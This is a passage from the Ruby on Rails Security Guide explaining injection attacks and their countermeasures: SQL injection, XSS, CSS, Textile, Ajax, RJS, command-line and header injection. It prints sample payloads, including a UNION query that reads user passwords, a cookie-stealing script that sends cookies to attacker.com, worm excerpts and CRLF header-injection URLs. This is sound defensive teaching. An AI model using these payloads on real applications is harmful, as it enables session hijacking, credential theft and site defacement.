<p>&#8212; <em>When sanitizing, protecting or verifying something, whitelists over blacklists.</em></p>
<p>A blacklist can be a list of bad e-mail addresses, non-public actions or bad <span class="caps">HTML</span> tags. This is opposed to a whitelist which lists the good e-mail addresses, public actions, good <span class="caps">HTML</span> tags and so on. Although, sometimes it is not possible to create a whitelist (in a <span class="caps">SPAM</span> filter, for example), <em class="highlight">prefer to use whitelist approaches</em>:</p>
<ul>
	<li>Use before_filter :only =&gt; [&#8230;] instead of :except =&gt; [&#8230;]. This way you don&#8217;t forget to turn it off for newly added actions.</li>
	<li>Use attr_accessible instead of attr_protected. See the mass-assignment section for details</li>
	<li>Allow &lt;strong&gt; instead of removing &lt;script&gt; against Cross-Site Scripting (<span class="caps">XSS</span>). See below for details.</li>
	<li>Don&#8217;t try to correct user input by blacklists:
	<ul>
		<li>This will make the attack work: &#8220;&lt;sc&lt;script&gt;ript&gt;&#8221;.gsub(&#8220;&lt;script&gt;&#8221;, &quot;&quot;)</li>
		<li>But reject malformed input</li>
	</ul></li>
</ul>
<p>Whitelists are also a good approach against the human factor of forgetting something in the blacklist.</p>
<h4 id="sql-injection">8.2 <span class="caps">SQL</span> Injection</h4>
<p>&#8212; <em>Thanks to clever methods, this is hardly a problem in most Rails applications. However, this is a very devastating and common attack in web applications, so it is important to understand the problem.</em></p>
<h5 id="introduction">8.2.1 Introduction</h5>
<p><span class="caps">SQL</span> injection attacks aim at influencing database queries by manipulating web application parameters. A popular goal of <span class="caps">SQL</span> injection attacks is to bypass authorization. Another goal is to carry out data manipulation or reading arbitrary data. Here is an example of how not to use user input data in a query:</p>
<div class="code_container"><code class="ruby">
Project.find(:all, :conditions =&gt; &quot;name = '#{params[:name]}'&quot;)
</code></div>
<p>This could be in a search action and the user may enter a project&#8217;s name that he wants to find. If a malicious user enters &#8217; OR 1=1&#8217;, the resulting <span class="caps">SQL</span> query will be:</p>
<pre>
SELECT * FROM projects WHERE name = '' OR 1 --'
</pre>
<p>The two dashes start a comment ignoring everything after it. So the query returns all records from the projects table including those blind to the user. This is because the condition is true for all records.</p>
<h5 id="bypassingauthorization">8.2.2 Bypassing authorization</h5>
<p>Usually a web application includes access control. The user enters his login credentials, the web applications tries to find the matching record in the users table. The application grants access when it finds a record. However, an attacker may possibly bypass this check with <span class="caps">SQL</span> injection. The following shows a typical database query in Rails to find the first record in the users table which matches the login credentials parameters supplied by the user.</p>
<div class="code_container"><code class="ruby">
User.find(:first, &quot;login = '#{params[:name]}' AND password = '#{params[:password]}'&quot;)
</code></div>
<p>If an attacker enters &#8217; OR &#8216;1&#8217;=&#8216;1 as the name, and &#8217; OR &#8217;2&#8217;&gt;&#8217;1 as the password, the resulting <span class="caps">SQL</span> query will be:</p>
<pre>
SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'&amp;gt;'1' LIMIT 1
</pre>
<p>This will simply find the first record in the database, and grants access to this user.</p>
<h5 id="unauthorizedreading">8.2.3 Unauthorized reading</h5>
<p>The <span class="caps">UNION</span> statement connects two <span class="caps">SQL</span> queries and returns the data in one set. An attacker can use it to read arbitrary data from the database. Let&#8217;s take the example from above:</p>
<div class="code_container"><code class="ruby">
Project.find(:all, :conditions =&gt; &quot;name = '#{params[:name]}'&quot;)
</code></div>
<p>And now let&#8217;s inject another query using the <span class="caps">UNION</span> statement:</p>
<pre>
') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
</pre>
<p>This will result in the following <span class="caps">SQL</span> query:</p>
<pre>
SELECT * FROM projects WHERE (name = '') UNION 
  SELECT id,login AS name,password AS description,1,1,1 FROM users --')
</pre>
<p>The result won&#8217;t be a list of projects (because there is no project with an empty name), but a list of user names and their password. So hopefully you encrypted the passwords in the database! The only problem for the attacker is, that the number of columns has to be the same in both queries. That&#8217;s why the second query includes a list of ones (1), which will be always the value 1, in order to match the number of columns in the first query.</p>
<p>Also, the second query renames some columns with the AS statement so that the web application displays the values from the user table. Be sure to update your Rails <a href="http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/">to at least 2.1.1</a>.</p>
<h5 id="countermeasures">8.2.4 Countermeasures</h5>
<p>Ruby on Rails has a built in filter for special <span class="caps">SQL</span> characters, which will escape &#8217; , &quot; , <span class="caps">NULL</span> character and line breaks. <em class="highlight">Using Model.find(id) or Model.find</em>by_some thing(something) automatically applies this countermeasure_. But in <span class="caps">SQL</span> fragments, especially <em class="highlight">in conditions fragments (:conditions =&gt; &#8220;&#8230;&#8221;), the connection.execute() or Model.find</em>by_sql() methods, it has to be applied manually_.</p>
<p>Instead of passing a string to the conditions option, you can pass an array to sanitize tainted strings like this:</p>
<div class="code_container"><code class="ruby">
Model.find(:first, :conditions =&gt; [&quot;login = ? AND password = ?&quot;, entered_user_name, entered_password])
</code></div>
<p>As you can see, the first part of the array is an <span class="caps">SQL</span> fragment with question marks. The sanitized versions of the variables in the second part of the array replace the question marks. Or you can pass a hash for the same result:</p>
<div class="code_container"><code class="ruby">
Model.find(:first, :conditions =&gt; {:login =&gt; entered_user_name, :password =&gt; entered_password})
</code></div>
<p>The array or hash form is only available in model instances. You can try <tt>sanitize_sql()</tt> elsewhere. <em class="highlight">Make it a habit to think about the security consequences when using an external string in <span class="caps">SQL</span></em>.</p>
<h4 id="cross-site-scripting-xss">8.3 Cross-Site Scripting (<span class="caps">XSS</span>)</h4>
<p>&#8212; <em>The most widespread, and one of the most devastating security vulnerabilities in web applications is <span class="caps">XSS</span>. This malicious attack injects client-side executable code. Rails provides helper methods to fend these attacks off.</em></p>
<h5 id="entrypoints">8.3.1 Entry points</h5>
<p>An entry point is a vulnerable <span class="caps">URL</span> and its parameters where an attacker can start an attack.</p>
<p>The most common entry points are message posts, user comments, and guest books, but project titles, document names and search result pages have also been vulnerable &#8211; just about everywhere where the user can input data. But the input does not necessarily have to come from input boxes on web sites, it can be in any <span class="caps">URL</span> parameter – obvious, hidden or internal. Remember that the user may intercept any traffic. Applications, such as the <a href="http://livehttpheaders.mozdev.org/">Live <span class="caps">HTTP</span> Headers Firefox plugin</a>, or client-site proxies make it easy to change requests.</p>
<p><span class="caps">XSS</span> attacks work like this: An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim. Most <span class="caps">XSS</span> examples simply display an alert box, but it is more powerful than that. <span class="caps">XSS</span> can steal the cookie, hijack the session; redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the web site to get confidential information or install malicious software through security holes in the web browser.</p>
<p>During the second half of 2007, there were 88 vulnerabilities reported in Mozilla browsers, 22 in Safari, 18 in IE, and 12 in Opera. The <a href="http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf">Symantec Global Internet Security threat report</a> also documented 239 browser plug-in vulnerabilities in the last six months of 2007. <a href="http://pandalabs.pandasecurity.com/archive/MPack-uncovered_2100_.aspx">Mpack</a> is a very active and up-to-date attack framework which exploits these vulnerabilities. For criminal hackers, it is very attractive to exploit an <span class="caps">SQL</span>-Injection vulnerability in a web application framework and insert malicious code in every textual table column. In April 2008 more than 510,000 sites <a href="http://www.0x000000.com/?i=556">were hacked</a> like this, among them the British government, United Nations and many more high targets.</p>
<p>A relatively new, and unusual, form of entry points are banner advertisements. In earlier 2008, malicious code appeared in banner ads on popular sites, such as MySpace and Excite, according to <a href="http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/">Trend Micro</a>.</p>
<h5 id="html-java-script-injection">8.3.2 <span class="caps">HTML</span>/JavaScript Injection</h5>
<p>The most common <span class="caps">XSS</span> language is of course the most popular client-side scripting language JavaScript, often in combination with <span class="caps">HTML</span>. <em class="highlight">Escaping user input is essential</em>.</p>
<p>Here is the most straightforward test to check for <span class="caps">XSS</span>:</p>
<pre>
&lt;script&gt;alert('Hello');&lt;/script&gt;
</pre>
<p>This JavaScript code will simply display an alert box. The next examples do exactly the same, only in very uncommon places:</p>
<pre>
&lt;img src=javascript:alert('Hello')&gt;
&lt;table background="javascript:alert('Hello')"&gt;
</pre>
<h6 id="cookietheft">8.3.2.1 Cookie theft</h6>
<p>These examples don&#8217;t do any harm so far, so let&#8217;s see how an attacker can steal the user&#8217;s cookie (and thus hijack the user&#8217;s session). In JavaScript you can use the document.cookie property to read and write the document&#8217;s cookie. JavaScript enforces the same origin policy, that means a script from one domain cannot access cookies of another domain. The document.cookie property holds the cookie of the originating web server. However, you can read and write this property, if you embed the code directly in the <span class="caps">HTML</span> document (as it happens with <span class="caps">XSS</span>). Inject this anywhere in your web application to see your own cookie on the result page:</p>
<pre>
&lt;script&gt;document.write(document.cookie);&lt;/script&gt;
</pre>
<p>For an attacker, of course, this is not useful, as the victim will see his own cookie. The next example will try to load an image from the <span class="caps">URL</span> http://www.attacker.com/ plus the cookie. Of course this <span class="caps">URL</span> does not exist, so the browser displays nothing. But the attacker can review his web server&#8217;s access log files to see the victims cookie.</p>
<pre>
&lt;script&gt;document.write('&lt;img src="http://www.attacker.com/' &lt;notextile&gt;&lt;tt&gt; document.cookie &lt;/tt&gt;&lt;/notextile&gt; '"&gt;');&lt;/script&gt;
</pre>
<p>The log files on www.attacker.com will read like this:</p>
<pre>
GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
</pre>
<p>You can mitigate these attacks (in the obvious way) by adding the <a href="http://dev.rubyonrails.org/ticket/8895">httpOnly</a> flag to cookies, so that document.cookie may not be read by JavaScript. Http only cookies can be used from IE v6.SP1, Firefox v2.0.0.5 and Opera 9.5. Safari is still considering, it ignores the option. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies <a href="http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/">will still be visible using Ajax</a>, though.</p>
<h6 id="defacement">8.3.2.2 Defacement</h6>
<p>With web page defacement an attacker can do a lot of things, for example, present false information or lure the victim on the attackers web site to steal the cookie, login credentials or other sensitive data. The most popular way is to include code from external sources by iframes:</p>
<pre>
&lt;iframe name=”StatPage” src="http://58.xx.xxx.xxx" width=5 height=5 style=”display:none”&gt;&lt;/iframe&gt;
</pre>
<p>This loads arbitrary <span class="caps">HTML</span> and/or JavaScript from an external source and embeds it as part of the site. This iFrame is taken from an <a href="http://www.symantec.com/enterprise/security_response/weblog/2007/06/italy_under_attack_mpack_gang.html">actual attack</a> on legitimate Italian sites using the <a href="http://isc.sans.org/diary.html?storyid=3015">Mpack attack framework</a>. Mpack tries to install malicious software through security holes in the web browser – very successfully, 50% of the attacks succeed.</p>
<p>A more specialized attack could overlap the entire web site or display a login form, which looks the same as the site&#8217;s original, but transmits the user name and password to the attackers site. Or it could use <span class="caps">CSS</span> and/or JavaScript to hide a legitimate link in the web application, and display another one at its place which redirects to a fake web site.</p>
<p>Reflected injection attacks are those where the payload is not stored to present it to the victim later on, but included in the <span class="caps">URL</span>. Especially search forms fail to escape the search string. The following link presented a page which stated that &#8220;George Bush appointed a 9 year old boy to be the chairperson&#8230;&#8221;:</p>
<pre>
http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1--&gt;
  &lt;script src=http://www.securitylab.ru/test/sc.js&gt;&lt;/script&gt;&lt;!--
</pre>
<h6 id="countermeasures">8.3.2.3 Countermeasures</h6>
<p><em class="highlight">It is very important to filter malicious input, but it is also important to escape the output of the web application</em>.</p>
<p>Especially for <span class="caps">XSS</span>, it is important to do <em class="highlight">whitelist input filtering instead of blacklist</em>. Whitelist filtering states the values allowed as opposed to the values not allowed. Blacklists are never complete.</p>
<p>Imagine a blacklist deletes “script” from the user input. Now the attacker injects “&lt;scrscriptipt&gt;”, and after the filter, “&lt;script&gt;” remains. Earlier versions of Rails used a blacklist approach for the strip_tags(), strip_links() and sanitize() method. So this kind of injection was possible:</p>
<pre>
strip_tags("some&lt;&lt;b&gt;script&gt;alert('hello')&lt;&lt;/b&gt;/script&gt;") 
</pre>
<p>This returned &#8220;some&lt;script&gt;alert(&#8216;hello&#8217;)&lt;/script&gt;&#8221;, which makes an attack work. That&#8217;s why I vote for a whitelist approach, using the updated Rails 2 method sanitize():</p>
<pre>
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, :tags =&gt; tags, :attributes =&gt; %w(href title))
</pre>
<p>This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.</p>
<p>As a second step, <em class="highlight">it is good practice to escape all output of the application</em>, especially when re-displaying user input, which hasn&#8217;t been input filtered (as in the search form example earlier on). <em class="highlight">Use escapeHTML() (or its alias h()) method</em> to replace the <span class="caps">HTML</span> input characters &amp;,&quot;,&lt;,&gt; by its uninterpreted representations in <span class="caps">HTML</span> (&amp;, &quot;, &lt; and &gt;). However, it can easily happen that the programmer forgets to use it, so <em class="highlight">it is recommended to use the <a href="http://safe-erb.rubyforge.org/svn/plugins/safe">SafeErb</a></em>erb/ plugin_. SafeErb reminds you to escape strings from external sources.</p>
<h6 id="obfuscationand-encoding-injection">8.3.2.4 Obfuscation and Encoding Injection</h6>
<p>Network traffic is mostly based on the limited Western alphabet, so new character encodings, such as Unicode, emerged, to transmit characters in other languages. But, this is also a threat to web applications, as malicious code can be hidden in different encodings that the web browser might be able to process, but the web application might not. Here is an attack vector in <span class="caps">UTF</span>-8 encoding:</p>
<pre>
&lt;IMG SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;
  &amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;&gt;
</pre>
<p>This example pops up a message box. It will be recognized by the above sanitize() filter, though. A great tool to obfuscate and encode strings, and thus “get to know your enemy”, is the <a href="http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php">Hackvertor</a>. Rails‘ sanitize() method does a good job to fend off encoding attacks.</p>
<h5 id="examplesfromtheunderground">8.3.3 Examples from the underground</h5>
<p></pre> <em>In order to understand today&#8217;s attacks on web applications, it&#8217;s best to take a look at some real-world attack vectors.</em></p>
<p>The following is an excerpt from the <a href="http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&amp;tabid=1">Js.Yamanner@m</a> Yahoo! Mail <a href="http://groovin.net/stuff/yammer.txt">worm</a>. It appeared on June 11, 2006 and was the first webmail interface worm:</p>
<pre>
&lt;img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif' 
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
</pre>
<p>The worms exploits a hole in Yahoo&#8217;s <span class="caps">HTML</span>/JavaScript filter, it usually filters all target and onload attributes from tags (because there can be JavaScript). The filter is applied only once, however, so the onload attribute with the worm code stays in place. This is a good example why blacklist filters are never complete and why it is hard to allow <span class="caps">HTML</span>/JavaScript in a web application.</p>
<p>Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details and a video demonstration on <a href="http://rosario.valotta.googlepages.com/home">Rosario Valotta&#8217;s website</a>. Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.</p>
<p>In December 2006, 34,000 actual user names and passwords were stolen in a <a href="http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html">MySpace phishing attack</a>. The idea of the attack was to create a profile page named “login_home_index_html”, so the <span class="caps">URL</span> looked very convincing. Specially-crafted <span class="caps">HTML</span> and <span class="caps">CSS</span> was used to hide the genuine MySpace content from the page and instead display its own login form.</p>
<p>The MySpace Samy worm will be discussed in the <span class="caps">CSS</span> Injection section.</p>
<h4 id="css-injection">8.4 <span class="caps">CSS</span> Injection</h4>
<p>&#8212; <em><span class="caps">CSS</span> Injection is actually JavaScript injection, because some browsers (IE, some versions of Safari and others) allow JavaScript in <span class="caps">CSS</span>. Think twice about allowing custom <span class="caps">CSS</span> in your web application.</em></p>
<p><span class="caps">CSS</span> Injection is explained best by a well-known worm, the <a href="http://namb.la/popular/tech.html">MySpace Samy worm</a>. This worm automatically sent a friend request to Samy (the attacker) simply by visiting his profile. Within several hours he had over 1 million friend requests, but it creates too much traffic on MySpace, so that the site goes offline. The following is a technical explanation of the worm.</p>
<p>MySpace blocks many tags, however it allows <span class="caps">CSS</span>. So the worm&#8217;s author put JavaScript into <span class="caps">CSS</span> like this:</p>
<pre>
&lt;div style="background:url('javascript:alert(1)')"&gt;
</pre>
<p>So the payload is in the style attribute. But there are no quotes allowed in the payload, because single and double quotes have already been used. But JavaScript allows has a handy eval() function which executes any string as code.</p>
<pre>
&lt;div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')"&gt; 
</pre>
<p>The eval() function is a nightmare for blacklist input filters, as it allows the style attribute to hide the word “innerHTML”:</p>
<pre>
alert(eval('document.body.inne' + 'rHTML')); 
</pre>
<p>The next problem was MySpace filtering the word “javascript”, so the author used “java&lt;<span class="caps">NEWLINE</span>&gt;script&quot; to get around this:</p>
<pre>
&lt;div id="mycode" expr="alert('hah!')" style="background:url('java↵ script:eval(document.all.mycode.expr)')"&gt;
</pre>
<p>Another problem for the worm&#8217;s author were <span class="caps">CSRF</span> security tokens. Without them he couldn&#8217;t send a friend request over <span class="caps">POST</span>. He got around it by sending a <span class="caps">GET</span> to the page right before adding a the user and parsing the result for the <span class="caps">CSRF</span> token.</p>
<p>In the end, he got a 4 KB worm, which he injected into his profile page.</p>
<p>The <a href="http://www.securiteam.com/securitynews/5LP051FHPE.html">moz-binding</a> <span class="caps">CSS</span> property proved to be another way to introduce JavaScript in <span class="caps">CSS</span> in Gecko-based browsers (Firefox, for example).</p>
<h5 id="countermeasures">8.4.1 Countermeasures
This example, again, showed that a blacklist filter is never complete. However, as custom <span class="caps">CSS</span> in web applications is a quite rare feature, I am not aware of a whitelist <span class="caps">CSS</span> filter. <em class="highlight">If you want to allow custom colours or images, you can allow the user to choose them and build the <span class="caps">CSS</span> in the web application</em>. Use Rails&#8217; <tt>sanitize()</tt> method as a model for a whitelist <span class="caps">CSS</span> filter, if you really need one.</h5>
<h4 id="textile-injection">8.5 Textile Injection</h4>
<p>&#8212; <em>If you want to provide text formatting other than <span class="caps">HTML</span> (due to security), use a mark-up language which is converted to <span class="caps">HTML</span> on the server-side. <a href="http://whytheluckystiff.net/ruby/redcloth/">RedCloth</a> is such a language for Ruby, but without precautions, it is also vulnerable to <span class="caps">XSS</span>.</em></p>
<p>For example, RedCloth translates <em>test</em> to &lt;em&gt;test&lt;em&amp;gt, which makes the text italic. However, up to the current version 3.0.4, it is still vulnerable to <span class="caps">XSS</span>. Get the <a href="http://www.redcloth.org">all-new version 4</a> that removed serious bugs. However, even that version has <a href="http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html">some security bugs</a>, so the countermeasures still apply. Here is an example for version 3.0.4:</p>
<pre>
&gt;&gt; RedCloth.new('&lt;script&gt;alert(1)&lt;/script&gt;').to_html
=&gt; "&lt;script&gt;alert(1)&lt;/script&gt;"
</pre>
<p>Use the :filter_html option to remove <span class="caps">HTML</span> which was not created by the Textile processor.</p>
<pre>
&gt;&gt; RedCloth.new('&lt;script&gt;alert(1)&lt;/script&gt;', [:filter_html]).to_html
=&gt; "alert(1)"
</pre>
<p>However, this does not filter all <span class="caps">HTML</span>, a few tags will be left (by design), for example &lt;a&gt;:</p>
<pre>
&gt;&gt; RedCloth.new("&lt;a href='javascript:alert(1)'&gt;hello&lt;/a&gt;", [:filter_html]).to_html
=&gt; "&lt;p&gt;&lt;a href="javascript:alert(1)"&gt;hello&lt;/a&gt;&lt;/p&gt;"
</pre>
<h5 id="countermeasures">8.5.1 Countermeasures</h5>
<p>It is recommended to <em class="highlight">use RedCloth in combination with a whitelist input filter</em>, as described in the countermeasures against <span class="caps">XSS</span>.</p>
<h4 id="ajax-injection">8.6 Ajax Injection</h4>
<p>&#8212; <em>The same security precautions have to be taken for Ajax actions as for “normal” ones. There is at least one exception, however: The output has to be escaped in the controller already, if the action doesn&#8217;t render a view.</em></p>
<p>If you use the <a href="http://dev.rubyonrails.org/browser/plugins/in_place_editing">in_place_editor plugin</a>, or actions that return a string, rather than rendering a view, <em class="highlight">you have to escape the return value in the action</em>. Otherwise, if the return value contains a <span class="caps">XSS</span> string, the malicious code will be executed upon return to the browser. Escape any input value using the h() method.</p>
<h4 id="rjs-injection">8.7 <span class="caps">RJS</span> Injection</h4>
<p>&#8212; <em>Don&#8217;t forget to escape in JavaScript (<span class="caps">RJS</span>) templates, too.</em></p>
<p>The <span class="caps">RJS</span> <span class="caps">API</span> generates blocks of JavaScript code based on Ruby code, thus allowing you to manipulate a view or parts of a view from the server side. <em class="highlight">If you allow user input in <span class="caps">RJS</span> templates, do escape it using escape</em>javascript() within JavaScript functions, and in <span class="caps">HTML</span> parts using h()_. Otherwise an attacker could execute arbitrary JavaScript.</p>
<h4 id="command-line-injection">8.8 Command Line Injection</h4>
<p>&#8212; <em>Use user-supplied command line parameters with caution.</em></p>
<p>If your application has to execute commands in the underlying operating system, there are several methods in Ruby: exec(command), syscall(command), system(command) and \<tt>command</tt>. You will have to be especially careful with these functions if the user may enter the whole command, or a part of it. This is because in most shells, you can execute another command at the end of the first one, concatenating them with a semicolon (;) or a vertical bar (|).</p>
<p>A countermeasure is to <em class="highlight">use the <tt>system(command, parameters)</tt> method which passes command line parameters safely</em>.</p>
<pre>
system("/bin/echo","hello; rm *")
# prints "hello; rm *" and does not delete files
</pre>
<h4 id="header-injection">8.9 Header Injection
&#8212; <em><span class="caps">HTTP</span> headers are dynamically generated and under certain circumstances user input may be injected. This can lead to false redirection, <span class="caps">XSS</span> or <span class="caps">HTTP</span> response splitting.</em></h4>
<p><span class="caps">HTTP</span> request headers have a Referer, User-Agent (client software) and Cookie field, among others. Response headers for example have a status code, Cookie and Location (redirection target <span class="caps">URL</span>) field. All of them are user-supplied and may be manipulated with more or less effort. <em class="highlight">Remember to escape these header fields, too.</em> For example when you display the user agent in an administration area.</p>
<p>Besides that, it is <em class="highlight">important to know what you are doing when building response headers partly based on user input.</em> For example you want to redirect the user back to a specific page. To do that you introduced a “referer“ field in a form to redirect to the given address:</p>
<pre>
redirect_to params[:referer]
</pre>
<p>What happens is that Rails puts the string into the Location header field and sends a 302 (redirect) status to the browser. The first thing a malicious user would do, is this:</p>
<pre>
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
</pre>
<p>And due to a bug in (Ruby and) Rails up to version 2.1.2 (excluding it), a hacker may inject arbitrary header fields; for example like this:</p>
<pre>
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
</pre>
<p>Note that &#8220;%0d%0a&#8221; is <span class="caps">URL</span>-encoded for &#8220;\r\n&#8221; which is a carriage-return and line-feed (<span class="caps">CRLF</span>) in Ruby. So the resulting <span class="caps">HTTP</span> header for the second example will be the following because the second Location header field overwrites the first.</p>
<pre>
HTTP/1.1 302 Moved Temporarily
(...)
Location: http://www.malicious.tld
</pre>
<p>So <em class="highlight">attack vectors for Header Injection are based on the injection of <span class="caps">CRLF</span> characters in a header field.</em> And what could an attacker do with a false redirection? He could redirect to a phishing site that looks the same as yours, but asks to login again (and sends the login credentials to the attacker). Or he could install malicious software through browser security holes on that site. <em class="highlight">Rails 2.1.2 escapes these characters for the Location field in the redirect</em>to method. Make sure you do it yourself when you build other header fields with user input._</p>
<h5 id="response-splitting">8.9.1 Response Splitting
If Header Injection was possible, Response Splitting might be, too. In <span class="caps">HTTP</span>, the header block is followed by two CRLFs and the actual data (usually <span class="caps">HTML</span>). The idea of Response Splitting is to inject two CRLFs into a header field, followed by another response with malicious <span class="caps">HTML</span>. The response will be:</h5>
<pre>
HTTP/1.1 302 Found [First standard 302 response]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Location: Content-Type: text/html


HTTP/1.1 200 OK [Second New response created by attacker begins]
Content-Type: text/html


&amp;lt;html&amp;gt;&amp;lt;font color=red&amp;gt;hey&amp;lt;/font&amp;gt;&amp;lt;/html&amp;gt; [Arbitary malicious input is
Keep-Alive: timeout=15, max=100         shown as the redirected page]
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html
</pre>
<p>Under certain circumstances this would present the malicious <span class="caps">HTML</span> to the victim. However, this seems to work with Keep-Alive connections, only (and many browsers are using one-time connections). But you can&#8217;t rely on this. <em class="highlight">In any case this is a serious bug, and you should update your Rails to version 2.0.5 or 2.1.2 to eliminate Header Injection (and thus response splitting) risks.</em></p>
<h3 id="additionalresources">9 Additional resources</h3>
<p>The security landscape shifts and it is important to keep up to date, because missing a new vulnerability can be catastrophic. You can find additional resources about (Rails) security here:</p>
<ul>
	<li>The Ruby on Rails security project posts security news regularly: <a href="http://www.rorsecurity.info">http://www.rorsecurity.info</a></li>
	<li>Subscribe to the Rails security <a href="http://groups.google.com/group/rubyonrails-security">mailing list</a></li>
	<li><a href="http://secunia.com/">Keep up to date on the other application layers</a> (they have a weekly newsletter, too)</li>
	<li>A <a href="http://ha.ckers.org/blog/">good security blog</a> including the <a href="http://ha.ckers.org/xss.html">Cross-Site scripting Cheat Sheet</a></li>
	<li>Another <a href="http://www.0x000000.com/">good security blog</a> with some Cheat Sheets, too</li>
</ul>
<h3 id="changelog">10 Changelog</h3>
<p><a href="http://rails.lighthouseapp.com/projects/16213-rails-guides/tickets/7">Lighthouse ticket</a></p>
<ul>
	<li>November 1, 2008: First approved version by Heiko Webers</li>
</ul>
      </div>
    </div>
  </div>

  <hr class="hide" />
  <div id="footer">
    <div class="wrapper">
      <p>Autores que contribuíram para guias completos estão listados <a href="credits.html">aqui</a>.<br />
        Tradutores que contribuíram na tradução dos guias originais para Língua Portuguesa estão listados <a href="translators.html">aqui</a>.<br />
        Este trabalho está licenciado sob a licença <a href="http://creativecommons.org/licenses/by-sa/3.0">Creative Commons Attribution-Share Alike 3.0</a>.</p>
      <p>"Rails", "Ruby on Rails", e o logo do Rails são marcas registradas de David Heinemeier Hansson. Todos os direitos reservados.</p>
    </div>
  </div>
</body>
</html>
